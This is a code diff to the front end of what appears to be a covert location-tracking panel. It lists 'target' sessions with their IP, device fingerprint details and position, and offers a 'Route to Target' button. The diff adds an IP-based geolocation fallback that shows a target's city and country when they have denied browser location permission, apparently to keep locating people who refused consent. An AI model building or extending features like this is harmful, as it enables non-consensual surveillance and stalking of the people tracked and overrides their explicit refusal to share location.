@@ -296,6 +296,7 @@
       <div class="info-row"><span>Screen</span><span id="iScreen">—</span></div>
       <div class="info-row"><span>Timezone</span><span id="iTimezone">—</span></div>
       <div class="info-row"><span>Last seen</span><span id="iTime">—</span></div>
+      <div class="info-row"><span>IP Location</span><span id="iIPLoc">—</span></div>
       <div class="info-row"><span>Points recorded</span><span id="iCount">—</span></div>
       <button class="route-btn" id="routeBtn" onclick="toggleRoute()">🗺 Route to Target</button>
       <button class="clear-btn" onclick="clearTrail()">🗑 Clear Trail</button>
@@ -531,6 +532,15 @@ function initSocket() {
     }
   });
 
+  socket.on("tracker:ipLocation", (data) => {
+    const { sessionId, country, region, city, lat, lon } = data;
+    if (!sessions[sessionId]) return;
+    sessions[sessionId].ipLocation = { country, region, city, lat, lon };
+    if (sessionId === activeSessionId) {
+      updateInfoPanel(sessionId);
+    }
+  });
+
   socket.on("device:info", (data) => {
     const { sessionId, ip, userAgent, platform, language, screenWidth, screenHeight, timezone } = data;
     if (!sessions[sessionId]) return;
@@ -573,7 +583,9 @@ function ensureSession(id, label, latest) {
       accuracyCircle: null,
       polyline: null,
       positions: [],
-      online: false
+      online: false,
+      ipLocation: null,
+      permissionDenied: false
     };
     if (latest) updatePosition(id, latest.lat, latest.lng, latest.accuracy, latest.speed, latest.heading, latest.timestamp, latest.altitude, latest.altitudeAccuracy);
     renderSessionList();
@@ -686,7 +698,7 @@ function renderSessionList() {
   list.innerHTML = ids.map(id => {
     const s = sessions[id];
     const last = s.positions[s.positions.length - 1];
-    const coords = last ? `${last.lat.toFixed(5)}, ${last.lng.toFixed(5)}` : (s.permissionDenied ? "Permission denied" : "Waiting for location…");
+    const coords = last ? `${last.lat.toFixed(5)}, ${last.lng.toFixed(5)}` : (s.ipLocation ? `${s.ipLocation.city || "Unknown"}, ${s.ipLocation.country || ""}` : (s.permissionDenied ? "Permission denied" : "Waiting for location…"));
     const active = id === activeSessionId ? " active" : "";
     const statusClass = s.permissionDenied ? "offline" : (s.online ? "online" : "");
     return `<div class="session-item${active}" onclick="selectSession('${id}')">
@@ -727,6 +739,13 @@ function updateInfoPanel(id) {
     document.getElementById("iAltAcc").textContent = last.altitudeAccuracy !== null && last.altitudeAccuracy !== undefined ? `±${Math.round(last.altitudeAccuracy)}m` : "N/A";
     document.getElementById("iTime").textContent = new Date(last.timestamp).toLocaleTimeString();
     document.getElementById("iCount").textContent = s.positions.length;
+  }
+  // IP Location (approximate)
+  if (s.ipLocation) {
+    const { city, region, country } = s.ipLocation;
+    document.getElementById("iIPLoc").textContent = city && country ? `${city}, ${country}` : (country || "N/A");
+  } else {
+    document.getElementById("iIPLoc").textContent = "—";
   }
   // Device info
   document.getElementById("iIP").textContent = dev?.ip || "—";
